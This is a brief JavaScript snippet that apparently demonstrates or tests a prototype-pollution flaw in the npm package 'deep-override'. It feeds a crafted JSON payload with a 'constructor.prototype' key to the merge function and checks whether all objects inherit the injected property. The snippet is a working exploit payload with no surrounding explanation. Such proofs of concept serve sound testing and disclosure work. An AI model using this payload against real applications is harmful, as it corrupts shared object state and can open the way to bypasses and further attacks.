var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);